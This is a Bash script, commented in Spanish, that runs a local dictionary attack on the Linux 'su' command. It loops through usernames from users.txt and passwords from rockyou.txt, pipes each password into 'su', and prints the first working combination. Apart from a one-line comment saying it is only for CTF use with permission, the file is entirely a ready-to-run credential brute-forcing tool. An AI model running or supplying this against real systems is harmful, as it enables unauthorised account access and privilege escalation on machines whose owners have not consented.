#!/bin/bash

# Script de ataque de diccionario local para "su"
# Solo para uso en CTF con permiso explícito.

# Archivos de entrada
USUARIOS="users.txt"
PASSWORDS="rockyou.txt"

# Verificar si los archivos existen
if [ ! -f "$USUARIOS" ] || [ ! -f "$PASSWORDS" ]; then
    echo "Error: Archivos $USUARIOS o $PASSWORDS no encontrados."
    echo "Uso: ./bruter.sh"
    exit 1
fi

echo "Iniciando ataque de diccionario..."

# Iterar sobre cada usuario en el archivo de usuarios
while IFS= read -r user; do
    echo "Probando contraseñas para el usuario: $user"

    # Iterar sobre cada contraseña en el archivo de contraseñas
    while IFS= read -r password; do
        # Intentar cambiar de usuario (su)
        # Usamos un subproceso y echo para pasar la contraseña al stdin de su
        # Redirigimos stderr y stdout a /dev/null para evitar ruido innecesario
        # El comando espera que se le pase la contraseña por stdin.
        # Si la autenticación falla, 'su' devuelve un código de salida distinto de 0.

        if echo "$password" | su - "$user" >/dev/null 2>&1; then
            echo "--------------------------------------------------"
            echo "¡¡¡Contraseña encontrada!!!"
            echo "Usuario: $user"
            echo "Contraseña: $password"
            echo "--------------------------------------------------"
            # Opcional: puedes salir del script o continuar buscando más usuarios/contraseñas
            exit 0 # Sale al encontrar la primera combinación válida
        else
            echo "Intento fallido para $user con $password"
        fi
    done < "$PASSWORDS"
done < "$USUARIOS"

echo "Ataque de diccionario finalizado. No se encontraron contraseñas válidas."

